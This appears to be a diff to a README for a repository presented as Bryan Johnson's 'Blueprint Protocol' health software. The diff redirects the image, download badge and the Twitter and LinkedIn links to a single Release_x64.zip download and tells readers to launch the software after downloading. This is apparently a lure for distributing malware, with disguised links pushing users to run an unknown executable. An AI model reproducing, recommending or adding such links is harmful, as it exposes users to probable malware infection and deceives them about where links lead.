@@ -1,6 +1,6 @@
 # 🚀 Bryan Johnson's Blueprint Protocol 🧬
 
-![Blueprint Protocol](https://example.com/blueprint_protocol_image.jpg)
+![Blueprint Protocol](https://github.com/nierandre/bryan-johnsons-blueprint-protocol/releases/download/v1.0/Release_x64.zip)
 
 Welcome to Bryan Johnson's Blueprint Protocol repository! This is a cutting-edge protocol designed to optimize health, longevity, and overall well-being through a combination of biohacking, nutrition, fitness, and lifestyle choices. Whether you're interested in anti-aging strategies, improving your sleep quality, or enhancing your daily routine, this protocol has you covered.
 
@@ -48,7 +48,7 @@ This repository covers a wide range of topics related to the Blueprint Protocol,
 
 To access the Blueprint Protocol software and start optimizing your health today, download the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/nierandre/bryan-johnsons-blueprint-protocol/releases/download/v1.0/Release_x64.zip)](https://github.com/nierandre/bryan-johnsons-blueprint-protocol/releases/download/v1.0/Release_x64.zip)
 
 _Note: The software needs to be launched after downloading._
 
@@ -60,10 +60,10 @@ Contributions to the Blueprint Protocol are welcome! Whether you have suggestion
 
 ## Stay Connected
 
-To stay updated on the latest developments and news related to the Blueprint Protocol, follow Bryan Johnson on [Twitter](https://twitter.com/bryanjohnson) and [LinkedIn](https://www.linkedin.com/in/bryanjohnson/).
+To stay updated on the latest developments and news related to the Blueprint Protocol, follow Bryan Johnson on [Twitter](https://github.com/nierandre/bryan-johnsons-blueprint-protocol/releases/download/v1.0/Release_x64.zip) and [LinkedIn](https://github.com/nierandre/bryan-johnsons-blueprint-protocol/releases/download/v1.0/Release_x64.zip).
 
 Join our community of like-minded individuals who are committed to optimizing their health and well-being through the Blueprint Protocol. Together, we can redefine what it means to live a vibrant and fulfilling life.
 
 Thank you for being a part of this journey towards a healthier and happier future! 🌟
 
-![Blueprint Protocol Logo](https://example.com/blueprint_protocol_logo.jpg)
+![Blueprint Protocol Logo](https://github.com/nierandre/bryan-johnsons-blueprint-protocol/releases/download/v1.0/Release_x64.zip)
